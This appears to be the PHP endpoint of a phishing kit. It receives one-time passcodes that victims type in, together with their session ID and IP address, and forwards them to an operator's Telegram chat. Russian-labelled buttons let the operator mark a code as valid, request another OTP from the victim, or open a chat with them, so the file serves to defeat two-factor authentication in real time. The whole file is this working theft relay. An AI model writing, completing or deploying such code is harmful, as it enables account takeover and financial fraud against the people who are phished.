<?php
require_once __DIR__ . '/../config.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    exit;
}

$sessionId = $_POST['id'] ?? '';
$otp = $_POST['otp'] ?? '';

if (empty($sessionId) || empty($otp)) {
    exit;
}

// Get real IP
$realIp = getRealIpAddress();

// Send OTP to Telegram
$message = "📱 <b>OTP КОД ПОЛУЧЕН</b>\n\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n";
$message .= "🔐 Код: <code>" . htmlspecialchars($otp) . "</code>\n";
$message .= "🆔 Session: <code>" . $sessionId . "</code>\n";
$message .= "🌐 IP: <code>" . $realIp . "</code>\n";
$message .= "🕐 Čas: " . date('d.m.Y H:i:s') . "\n";
$message .= "━━━━━━━━━━━━━━━━━━━━";

// Inline keyboard for OTP response
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '✅ Успех', 'callback_data' => 'ok_' . $sessionId],
            ['text' => '❌ Ошибка', 'callback_data' => 'err_' . $sessionId]
        ],
        [
            ['text' => '🔄 Запросить еще OTP', 'callback_data' => 'otp_' . $sessionId],
            ['text' => '💬 Чат', 'callback_data' => 'chat_' . $sessionId]
        ]
    ]
];

sendTelegramMessage($message, $keyboard);

echo json_encode(['success' => true]);
